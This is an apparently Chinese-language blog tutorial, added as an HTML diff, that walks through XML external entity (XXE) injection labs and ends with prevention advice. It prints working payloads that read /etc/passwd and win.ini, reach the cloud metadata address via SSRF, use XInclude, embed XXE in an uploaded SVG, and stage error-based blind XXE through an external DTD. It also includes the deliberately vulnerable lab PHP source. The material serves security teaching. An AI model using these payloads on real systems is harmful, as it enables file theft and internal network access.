@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XXE注入方法 | Banana69</title><meta name="keywords" content="XXE Web"><meta name="author" content="Banana69"><meta name="copyright" content="Banana69"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x01 XML 攻击原理① XML介绍： XML实体： XML是一种被设计用于存储和传输数据的”可扩展标记语言”，且XML使用标签和数据的树状结构，XML不需要使用预定义标签。 XML实体是在XML文档中表示数据项的一种方式，XML在语言规范中内置了很多实体。例如**&amp;lt表示&lt;**,**&amp;gt**表示**&gt;**。所以当这些字符出现在数据中时一般需要使用它们的实体来表">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE注入方法">
+<meta property="og:url" content="https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Banana69">
+<meta property="og:description" content="0x01 XML 攻击原理① XML介绍： XML实体： XML是一种被设计用于存储和传输数据的”可扩展标记语言”，且XML使用标签和数据的树状结构，XML不需要使用预定义标签。 XML实体是在XML文档中表示数据项的一种方式，XML在语言规范中内置了很多实体。例如**&amp;lt表示&lt;**,**&amp;gt**表示**&gt;**。所以当这些字符出现在数据中时一般需要使用它们的实体来表">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2019-09-24T07:21:46.000Z">
+<meta property="article:modified_time" content="2021-10-06T06:19:03.971Z">
+<meta property="article:author" content="Banana69">
+<meta property="article:tag" content="XXE Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XXE注入方法',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-06 14:19:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Banana69</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">XXE注入方法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2019-09-24T07:21:46.000Z" title="发表于 2019-09-24 15:21:46">2019-09-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XXE注入方法"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h4 id="0x01-XML-攻击原理"><a href="#0x01-XML-攻击原理" class="headerlink" title="0x01 XML 攻击原理"></a>0x01 XML 攻击原理</h4><h6 id="①-XML介绍："><a href="#①-XML介绍：" class="headerlink" title="① XML介绍："></a>① XML介绍：</h6><ul>
+<li><p><strong>XML</strong>实体：</p>
+<p><strong>XML</strong>是一种被设计用于存储和传输数据的”可扩展标记语言”，且XML使用标签和数据的树状结构，XML不需要使用预定义标签。</p>
+<p><strong>XML</strong>实体是在<strong>XML</strong>文档中表示数据项的一种方式，<strong>XML</strong>在语言规范中内置了很多实体。例如**&amp;lt<strong>表示</strong>&lt;**,**&amp;gt**表示**&gt;**。所以当这些字符出现在数据中时一般需要使用它们的实体来表示。</p>
+<p><img src="/image/XXE/2.png" alt="2"></p>
+</li>
+<li><p>文档类型定义：</p>
+<p><strong>XML</strong>文档类型定义**(document type definition ，DTD)<strong>包含的声明可以定义</strong>XML<strong>文档的结构。</strong>DTD<strong>可以独立于文档本身（内部</strong>DTD<strong>），也可以从外部加载（外部</strong>DTD**）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>自定义实体与外部实体：</p>
+<p><strong>XML</strong>允许在<strong>DTD</strong>中自定义实体，如<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code>，意味着XML文档中任何引用**&amp;myextity<strong>实体的值都会被替换为</strong>“my entity value”**。</p>
+<p><strong>XML</strong>外部实体也是一种自定义实体，但是其定义必须位于声明他们的<strong>DTD</strong>之外。外部实体使用<strong>SYSTEM</strong>关键字时，必须指定加载实体值的<strong>URL</strong>。例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code>，又因为URL可以使用file://协议，因此可以从文件中加载外部实体，例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code>，所以XML外部实体提供了XML外部实体攻击的主要方法。</p>
+<blockquote>
+<p><em>内部实体声明语法</em><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
+<p><em>外部实体声明语法</em><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
+</blockquote>
+<h6 id="②-XML外部实体注入："><a href="#②-XML外部实体注入：" class="headerlink" title="② XML外部实体注入："></a>② XML外部实体注入：</h6></li>
+</ul>
+<p>​    <strong>XML</strong> 外部实体注入（也称为 <strong>XXE</strong>）是一种 <strong>Web</strong> 安全漏洞，允许攻击者干扰应用程序对 <strong>XML</strong> 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p>
+<p><img src="/image/XXE/1.png" alt="1"></p>
+<p>一些应用程序使用 <strong>XML</strong> 格式在浏览器和服务器之间传输数据。执行此操作的应用程序实际上总是使用标准库或平台 <strong>API</strong> 来处理服务器上的 <strong>XML</strong> 数据。<strong>XXE</strong> 漏洞的出现是因为 <strong>XML</strong> 规范包含各种潜在的危险特性，标准解析器支持这些特性，即使它们通常不被应用程序使用。</p>
+<h4 id="0x02-XXE-攻击类型"><a href="#0x02-XXE-攻击类型" class="headerlink" title="0x02 XXE 攻击类型"></a>0x02 XXE 攻击类型</h4><ul>
+<li><p>利用<strong>XXE</strong>读取（检索）<strong>files</strong>：</p>
+<p>定义一个包含文件内容的外部实体，并在应用程序的响应中返回，如上图所示。</p>
+</li>
+<li><p>利用<strong>XXE</strong>执行<strong>SSRF</strong>攻击：</p>
+<p>根据后端系统的 URL 定义外部实体。</p>
+</li>
+<li><p>利用盲<strong>XXE</strong>（无回显）造成数据泄露：</p>
+<p>敏感数据从应用服务器传输到攻击者控制的系统。</p>
+</li>
+<li><p>利用盲<strong>XXE</strong>通过错误消息检索数据：</p>
+<p>攻击者可以在其中触发包含敏感数据的解析错误消息。</p>
+</li>
+</ul>
+<h4 id="0x03-XXE-攻击实验"><a href="#0x03-XXE-攻击实验" class="headerlink" title="0x03 XXE 攻击实验"></a>0x03 XXE 攻击实验</h4><h6 id="①-利用XXE检索文件"><a href="#①-利用XXE检索文件" class="headerlink" title="① 利用XXE检索文件"></a>① 利用XXE检索文件</h6><p><strong>XXE-Labs</strong>的环境比较简单，下边是源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//这里面因为没有xml文档所以用的是php的伪协议来获取我们发送的xml文档</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建XML的对象</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//将我们发送的字符串生成xml文档。</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//这一步感觉相当于实例化xml文档</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;<span class="comment">//获取username标签的值</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;<span class="comment">//获取password标签的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;<span class="comment">//将获取的值与前面的进行比较。...</span></span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);<span class="comment">//注意必须要有username这个标签，不然的话找不到username,就没有了输出了，我们也不能通过回显来获取信息了</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);<span class="comment">//与上方相同，都会输出username的值，都可以达到我们的目的</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>该环境只需要使用<strong>Burp</strong>抓包后在发送数据时构造外部实体定义即可完成，在执行<strong>XXE</strong>攻击时需要在将<strong>username</strong>替换为对外部实体的引用。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/XXE/3.png" alt="3"></p>
+<h6 id="②-利用XXE进行SSRF攻击"><a href="#②-利用XXE进行SSRF攻击" class="headerlink" title="② 利用XXE进行SSRF攻击"></a>② 利用XXE进行SSRF攻击</h6><p>实验环境：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p>
+<p>构造外部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;http://169.254.169.254/&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将<code>productId</code>数字替换为对外部实体的引用：<code>&amp;ent</code>即可利用XXE漏洞来执行SSRF攻击。</p>
+<p>  <img src="/image/XXE/4.png" alt="4"></p>
+<p>在<strong>Response</strong>中可以看到返回值为<code>Invalid product ID latest</code>，继续尝试访问<code>latest</code>目录，查看相应的返回值最后完成该实验，实现了利用<strong>XXE</strong>进行<strong>SSRF</strong>攻击。</p>
+<p><img src="/image/XXE/5.png" alt="5"></p>
+<h6 id="③-通过XInclude-进行XXE攻击"><a href="#③-通过XInclude-进行XXE攻击" class="headerlink" title="③ 通过XInclude 进行XXE攻击"></a>③ 通过XInclude 进行XXE攻击</h6><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 <strong>XML</strong> 文档中，然后解析该文档。当客户端提交的数据被放入后端 <strong>SOAP</strong> 请求，然后由后端 <strong>SOAP</strong> 服务处理时，就会发生这种情况。</p>
+<p>在这种情况下由于无法控制整个 <strong>XML</strong> 文档，所以法执行经典的 <strong>XXE</strong> 攻击，因此无法定义或修改<code>DOCTYPE</code>元素。但是可以利用<strong>XInclude</strong>。</p>
+<p><strong>XInclude</strong>是 <strong>XML</strong> 规范的一部分，它允许从子文档构建 <strong>XML</strong> 文档。因此<strong>XInclude</strong>可以在 <strong>XML</strong> 文档中的任何数据值中部署<strong>XInclude</strong>攻击，因此，攻击可以在仅控制放在服务器端XML文档中的单个数据项的情况下执行。要执行<strong>XInclude</strong>攻击，需要引用<strong>XInclude</strong>名称空间并提供希望包含的文件的路径。例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在该实验中，将<strong>productId</strong>的值改为构造的<strong>XInclude</strong>指令即可。</p>
+<p><img src="/image/XXE/6.png" alt="6"></p>
+<h6 id="④-通过文件上传的-XXE-攻击"><a href="#④-通过文件上传的-XXE-攻击" class="headerlink" title="④ 通过文件上传的 XXE 攻击"></a>④ 通过文件上传的 XXE 攻击</h6><p>有些应用程序允许用户上传文件，然后在服务器端处理这些文件。一些常见的文件格式使用<strong>XML</strong>或包含XML子组件。基于<strong>xml</strong>的格式的例子有<strong>DOCX</strong>这样的办公文档格式和<strong>SVG</strong>这样的图像格式。</p>
+<p>例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收<strong>PNG</strong>或<strong>JPEG</strong>这样的格式，所使用的图像处理库也可能支持<strong>SVG</strong>图像。由于<strong>SVG</strong>格式使用<strong>XML</strong>，攻击者可以提交恶意<strong>SVG</strong>图像，从而达到针对<strong>XXE</strong>漏洞的隐藏攻击面。</p>
+<p>该实验环境需要创建<strong>svg</strong>文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后上传此svg图像，</p>
+<p><img src="/image/XXE/7.png" alt="7"></p>
+<p>然后在查看评论时会在头像中看到<code>/etc/hostname</code>的内容</p>
+<p><img src="/image/XXE/8.png" alt="8"></p>
+<h6 id="⑤-无回显-XXE-通过错误消息检索数据"><a href="#⑤-无回显-XXE-通过错误消息检索数据" class="headerlink" title="⑤ 无回显 XXE 通过错误消息检索数据"></a>⑤ 无回显 XXE 通过错误消息检索数据</h6><p>利用无回显的一种方法是触发一个<strong>XML</strong>解析错误,其中错误消息包含检索的敏感数据。如果应用程序在其响应中返回错误消息，这将是有效的。</p>
+<p>可以使用恶意的外部<strong>DTD</strong>触发包含**/etc/passwd**文件内容的XML解析错误消息，如下所示:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
+
+<p>该<strong>DTD</strong>的执行步骤为：</p>
+<ul>
+<li>定义一个称为<strong>file</strong>的<strong>XML</strong>参数实体，包含**/etc/passwd**文件的内容。</li>
+</ul>
+<ul>
+<li>定义一个名为<strong>eval</strong>的<strong>XML</strong>参数实体，其中包含名为<strong>error</strong>的另一个<strong>XML</strong>参数实体的动态声明。通过加载一个名称包含文件实体值的不存在的文件来评估错误实体。</li>
+</ul>
+<ul>
+<li>使用<strong>eval</strong>实体，它会执行错误实体的动态声明。</li>
+</ul>
+<ul>
+<li>使用<strong>error</strong>实体，以便通过尝试加载不存在的文件来评估它的值，从而导致包含不存在文件的名称(即**/etc/passwd**文件的内容)的错误消息。</li>
+</ul>
+<p>在此次实验中，需要用到的<strong>DTD</strong>为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">/etc/passwdfile</span><br></pre></td></tr></table></figure>
+
+<p>首先在实验室环境中的<code>Go to exploit server</code>处上传<strong>DTD</strong>生成一个恶意的<strong>URL</strong></p>
+<p>然后在<code>check stock</code>功能处插入外部实体即可完成<strong>XXE</strong>攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;`</span><br><span class="line">`/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/XXE/9.png" alt="9"></p>
+<h4 id="0x04-XXE-攻击预防"><a href="#0x04-XXE-攻击预防" class="headerlink" title="0x04 XXE 攻击预防"></a>0x04 XXE 攻击预防</h4><p>几乎所有<strong>XXE</strong>漏洞的出现都是因为应用程序的<strong>XML</strong>解析库支持应用程序不需要或不打算使用的潜在危险的<strong>XML</strong>特性。防止<strong>XXE</strong>攻击的最简单和最有效的方法是禁用这些特性。通常，只要禁用外部实体的解析和禁用对<strong>XInclude</strong>的支持就足够了。可以通过配置选项或通过编程覆盖默认行为来实现。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Banana69</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Banana69.site" target="_blank">Banana69</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XXE-Web/">XXE Web</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">命令执行漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Banana69</div><div class="author-info__description">菜鸡的博客</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Banannna69"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Banannna69" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:junminn@126.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-XML-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">0x01 XML 攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A0-XML%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-text">① XML介绍：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A1-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-text">② XML外部实体注入：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-XXE-%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-text">0x02 XXE 攻击类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-XXE-%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C"><span class="toc-text">0x03 XXE 攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A0-%E5%88%A9%E7%94%A8XXE%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-text">① 利用XXE检索文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A1-%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E6%94%BB%E5%87%BB"><span class="toc-text">② 利用XXE进行SSRF攻击</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 